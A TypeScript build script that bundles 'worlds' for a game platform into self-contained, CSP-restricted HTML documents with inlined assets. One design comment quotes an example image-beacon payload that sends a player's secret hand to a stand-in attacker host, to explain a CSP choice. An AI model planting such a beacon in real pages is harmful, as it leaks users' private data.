/**
 * Publish step for `worlds/` — the unscored, co-created counterpart to `games/`.
 *
 * A world has no backend logic (nothing is scored, so nothing needs authoritative
 * simulation), which makes its artifact simpler than a game's: ONE self-contained
 * HTML document, hash-pinned, that the Arena frontend loads into a sandboxed
 * iframe. Everything the world needs at runtime — identity, storage, theme,
 * assets — is injected by the host, so the document carries no imports and makes
 * no requests.
 *
 * "Self-contained" is a hard requirement rather than a preference: the host loads
 * the document via iframe `srcdoc`, whose opaque origin cannot resolve a relative
 * `import './chunk.js'`. A multi-chunk build would render a blank frame with no
 * error, so the bundle step below inlines everything and CI rejects the rest.
 *
 * Output rides in the SAME `dist/index.json` as games, under `worlds[]`, so a
 * Release stays one file and the backend keeps one source of truth.
 */
import { readFile, readdir, writeFile, mkdir } from 'node:fs/promises'
import { existsSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { createHash } from 'node:crypto'
import path from 'node:path'
import esbuild from 'esbuild'
import type { WorldManifest } from '@arena/world-sdk'

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const WORLDS_DIR = path.join(ROOT, 'worlds')

/**
 * Ceiling on the built document. Unlike a game bundle (which the backend caps at
 * 512KB before handing it to an isolate), a world's document is inlined into
 * `index.json`, which the backend fetches on every refresh and holds in memory.
 * A few multi-megabyte worlds would make that payload the platform's problem.
 */
const MAX_HTML_BYTES = 1_500_000
const MAX_COVER_BYTES = 400_000
/** Ceiling on `assets/**` combined. They ride inside index.json, same as the document. */
const MAX_ASSETS_BYTES = 2_000_000

export interface WorldIndexEntry {
  type: string
  slug: string
  displayName: string
  sdkVersion: string
  contentHash: string
  /** The whole document, inlined. */
  html: string
  schemaVersion: number
  supportedSchemaVersions: number[]
  storage: WorldManifest['storage'] | null
  presentation: WorldManifest['presentation']
  aboutMarkdown: string | null
  /** Cover as a `data:` URI, so the index carries no external asset references. */
  cover: string | null
  /**
   * `assets/**` as `data:` URIs, keyed by repo-relative path, handed to the world
   * through `ctx.asset(path)`.
   *
   * Serving these over HTTP would need an asset origin, a route and a CSP entry
   * allowing it — three moving parts that exist only to fetch bytes the index
   * already contains. `data:` is already allowed by `img-src` / `media-src`, so
   * there is no host to whitelist and no outbound request to reason about.
   */
  assets: Record<string, string>
}

/**
 * Bundle a world entry into one inline script.
 *
 * `loader` inlines images, audio and fonts as data URIs. That is what keeps the
 * document self-contained — and it is also why the size cap above matters, since
 * inlining is the easy way to accidentally ship a 10MB index.
 */
export async function bundleWorld(entryFile: string): Promise<string> {
  const out = await esbuild.build({
    entryPoints: [entryFile],
    bundle: true,
    format: 'iife',
    platform: 'browser',
    target: 'es2022',
    legalComments: 'none',
    minify: true,
    write: false,
    logLevel: 'silent',
    loader: {
      '.png': 'dataurl',
      '.jpg': 'dataurl',
      '.jpeg': 'dataurl',
      '.gif': 'dataurl',
      '.svg': 'dataurl',
      '.webp': 'dataurl',
      '.mp3': 'dataurl',
      '.ogg': 'dataurl',
      '.wav': 'dataurl',
      '.woff2': 'dataurl',
    },
  })
  const text = out.outputFiles?.[0]?.text
  if (!text) throw new Error(`esbuild produced no output for ${entryFile}`)
  return text
}

/**
 * Wrap the bundled script in a self-contained, CSP-locked document.
 *
 * This policy is deliberately looser than a game view's, and the reason should
 * stay attached to the code. Games lock `img-src` to `data:` because a
 * hidden-information game's per-viewer frame contains that viewer's SECRETS, so
 * an `<img src="https://attacker/?hand">` beacon would exfiltrate them (#2031).
 *
 * A world renders nothing private — every record it draws is public, co-created
 * content — so that argument does not apply, and allowing real images and audio
 * is what lets an authored world look and sound like itself. `connect-src` stays
 * `'none'`: the world still cannot open a channel of its own, and every read and
 * write goes through the host's allowlisted postMessage proxy.
 *
 * The Arena frontend injects this same policy into the `srcdoc` as defence in
 * depth, since a response-header CSP does not apply to srcdoc documents.
 */
export function worldHtml(js: string, displayName: string): string {
  const safe = js.replace(/<\/script>/gi, '<\\/script>')
  const title = displayName.replace(/[<>&]/g, '')
  return `<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: https:; media-src data: https:; font-src data:; connect-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>${title}</title>
<style>html,body{margin:0;height:100%;overflow:hidden}</style>
</head><body><script>${safe}</script></body></html>`
}

const MIME: Record<string, string> = {
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.webp': 'image/webp',
  '.svg': 'image/svg+xml',
  '.mp3': 'audio/mpeg',
  '.ogg': 'audio/ogg',
  '.wav': 'audio/wav',
  '.woff2': 'font/woff2',
  '.json': 'application/json',
  '.txt': 'text/plain',
}

function mimeOf(file: string): string {
  return MIME[path.extname(file).toLowerCase()] ?? 'application/octet-stream'
}

/**
 * Inline every file under `assets/`, keyed by its path relative to the world dir.
 *
 * Exported so `preview-world` can hand a world the same map the host does. A
 * preview that served `ctx.asset()` an empty map would make every asset throw
 * locally and resolve in production — the one direction of divergence an author
 * cannot debug.
 */
export async function readAssets(dir: string): Promise<Record<string, string>> {
  const base = path.join(dir, 'assets')
  if (!existsSync(base)) return {}

  const out: Record<string, string> = {}
  let total = 0

  const walk = async (current: string): Promise<void> => {
    for (const e of await readdir(current, { withFileTypes: true })) {
      const full = path.join(current, e.name)
      if (e.isDirectory()) {
        await walk(full)
        continue
      }
      const buf = await readFile(full)
      total += buf.byteLength
      if (total > MAX_ASSETS_BYTES) {
        throw new Error(`assets/ exceeds ${MAX_ASSETS_BYTES} bytes (they are inlined into index.json)`)
      }
      const key = path.relative(dir, full).split(path.sep).join('/')
      out[key] = `data:${mimeOf(full)};base64,${buf.toString('base64')}`
    }
  }

  await walk(base)
  return out
}

/** Inline the cover so `index.json` references no external asset. */
async function readCover(dir: string, rel: string): Promise<string> {
  const full = path.join(dir, rel)
  const buf = await readFile(full)
  if (buf.byteLength > MAX_COVER_BYTES) {
    throw new Error(`cover is ${buf.byteLength} bytes; max ${MAX_COVER_BYTES}`)
  }
  return `data:${mimeOf(full)};base64,${buf.toString('base64')}`
}

export async function buildWorlds(dist: string): Promise<WorldIndexEntry[]> {
  if (!existsSync(WORLDS_DIR)) return []
  await mkdir(path.join(dist, 'worlds'), { recursive: true })

  const entries: WorldIndexEntry[] = []
  for (const d of await readdir(WORLDS_DIR, { withFileTypes: true })) {
    if (!d.isDirectory()) continue
    const dir = path.join(WORLDS_DIR, d.name)
    const manifestPath = path.join(dir, 'world.manifest.json')
    if (!existsSync(manifestPath)) continue

    const manifest = JSON.parse(await readFile(manifestPath, 'utf8')) as WorldManifest

    const js = await bundleWorld(path.join(dir, manifest.entry))
    const html = worldHtml(js, manifest.displayName)
    const bytes = Buffer.byteLength(html, 'utf8')
    if (bytes > MAX_HTML_BYTES) {
      throw new Error(`${manifest.type}: document is ${bytes} bytes; max ${MAX_HTML_BYTES}`)
    }
    const contentHash = createHash('sha256').update(html).digest('hex')
    await writeFile(path.join(dist, 'worlds', `${manifest.type}.html`), html, 'utf8')

    const aboutMarkdown =
      manifest.about && existsSync(path.join(dir, manifest.about))
        ? await readFile(path.join(dir, manifest.about), 'utf8')
        : null

    entries.push({
      type: manifest.type,
      slug: d.name,
      displayName: manifest.displayName,
      sdkVersion: manifest.sdkVersion ?? '0.0.0',
      contentHash,
      html,
      schemaVersion: manifest.schemaVersion,
      supportedSchemaVersions: manifest.supportedSchemaVersions,
      storage: manifest.storage ?? null,
      presentation: manifest.presentation,
      aboutMarkdown,
      cover: await readCover(dir, manifest.presentation.cover),
      assets: await readAssets(dir),
    })

    const collections = Object.keys(manifest.storage?.collections ?? {})
    console.log(
      `built world ${manifest.type} (${(bytes / 1024).toFixed(1)}kb, ${contentHash.slice(0, 12)})` +
        (collections.length ? ` + ${collections.length} collection(s): ${collections.join(', ')}` : ' — read-only'),
    )
  }
  return entries
}
